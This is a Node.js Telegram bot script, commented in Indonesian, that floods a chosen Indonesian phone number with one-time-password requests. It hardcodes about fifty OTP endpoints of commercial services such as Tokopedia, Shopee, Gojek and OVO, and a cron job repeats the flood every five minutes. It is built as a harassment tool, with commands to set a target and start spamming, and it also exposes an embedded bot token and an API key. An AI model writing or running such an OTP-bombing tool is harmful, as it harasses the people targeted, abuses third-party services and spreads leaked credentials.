const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment-timezone');
const cron = require('node-cron');

// Ganti dengan token bot Anda
const token = '7863322072:AAFLohSBYqeTpx8eLrsZz0YBD_4rEP627-4';
const bot = new TelegramBot(token, {polling: true});

// Daftar endpoint API OTP (dipersingkat dan diperbaiki koma)
const otpEndpoints = [
  'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
  'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
  'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=',
  'https://sofia.bmsecure.id/central-api/oauth/token',
  'https://sofia.bmsecure.id/central-api/sc-api/otp/generate',
  'https://keranjangbelanja.co.id/api/v1/user/otp',
  'https://titipku.tech/v1/mobile/auth/otp?method=wa'
];

// Variabel untuk menyimpan nomor target
let targetNumber = '';

// Fungsi untuk mengirim OTP
async function sendOTP(number) {
  const dateTime = moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
  let successCount = 0;
  let failedCount = 0;
  
  try {
    bot.sendMessage(number, `🚀 Memulai pengiriman OTP ke ${number} pada ${dateTime}`);
    
    // Mengirim ke semua endpoint secara paralel
    const requests = otpEndpoints.map(endpoint => 
      axios.post(endpoint, { phone: number })
        .then(() => {
          successCount++;
          return `${endpoint} ✅`;
        })
        .catch(error => {
          failedCount++;
          return `${endpoint} ❌ (${error.message})`;
        })
    );
    
    const results = await Promise.all(requests);
    
    // Kirim laporan
    const report = `📊 Laporan OTP:\n\n` +
                  `✅ Berhasil: ${successCount}\n` +
                  `❌ Gagal: ${failedCount}\n\n` +
                  `🕒 Waktu: ${dateTime}\n\n` +
                  `🔧 Detail:\n${results.slice(0, 10).join('\n')}` +
                  (results.length > 10 ? `\n\n...dan ${results.length - 10} endpoint lainnya` : '');
    
    bot.sendMessage(number, report);
    
  } catch (error) {
    bot.sendMessage(number, `❌ Error: ${error.message}`);
  }
}

// Fungsi untuk spam OTP
function startSpam(number, intervalMinutes = 5) {
  // Jalankan segera
  sendOTP(number);
  
  // Jadwalkan setiap X menit
  return cron.schedule(`*/${intervalMinutes} * * * *`, () => {
    sendOTP(number);
  });
}

// Variabel untuk menyimpan job spam
let spamJob = null;

// Command handler
bot.onText(/\/mulai/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Silakan kirim nomor HP target dengan format +62xxxxxxxxxxx');
});

bot.onText(/\/spam (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1];
  
  if (!number.startsWith('+62')) {
    bot.sendMessage(chatId, 'Format nomor salah! Gunakan format +62xxxxxxxxxxx');
    return;
  }
  
  targetNumber = number;
  
  // Hentikan spam sebelumnya jika ada
  if (spamJob) {
    spamJob.stop();
  }
  
  // Mulai spam baru
  spamJob = startSpam(targetNumber);
  
  bot.sendMessage(chatId, `🚀 Memulai spam OTP ke ${targetNumber} setiap 5 menit`);
});

bot.onText(/\/tutor/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '📺 Tutorial YouTube: https://youtu.be/example');
});

bot.onText(/\/yt/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '📢 Subscribe channel saya: https://youtube.com/c/mychannel');
});

bot.onText(/\/tiktok/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '🎵 Follow TikTok saya: https://tiktok.com/@myaccount');
});

bot.onText(/\/donasi/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '💖 Donasi:\n- Dana: 081234567890\n- OVO: 081234567890\nTerima kasih!');
});

// Tangkap nomor HP
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (text && text.startsWith('+62') && text.length > 5 && !text.startsWith('/')) {
    targetNumber = text;
    bot.sendMessage(chatId, `Nomor target diset ke ${targetNumber}\nGunakan /spam ${targetNumber} untuk memulai`);
  }
});

// Tampilkan info waktu saat bot aktif
const now = moment().tz('Asia/Jakarta');
console.log(`🤖 Bot aktif pada ${now.format('dddd, DD MMMM YYYY HH:mm:ss')}`);

// Pesan saat bot aktif
bot.on('polling_error', (error) => {
  console.log(error);
});

console.log('Bot sedangberjalan dan siap menerima perintah...');
